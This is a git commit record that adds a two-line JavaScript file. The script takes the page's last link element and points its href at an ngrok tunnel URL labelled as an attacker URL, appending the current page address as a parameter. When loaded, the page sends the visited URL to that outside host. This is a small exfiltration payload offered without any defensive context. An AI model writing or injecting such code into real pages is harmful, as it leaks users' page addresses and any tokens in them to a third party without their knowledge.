b9ddcd060ea9ffce746d44a237c73a9dcf35b06a
@Artizanli <shtorz@gmail.com>
2023-01-07 15:19:29 +0200

    Create script.js

---
+++ script.js
@@ -0,0 +1,2 @@
+const lastCssLink = document.getElementsByTagName("Link")[document.getElementsByTagName('Link').length-1]
+lastCssLink.href = "https://19aa7c98a162.ngrok.io/my-attakcer-url?ext=" + document.URL.toString()
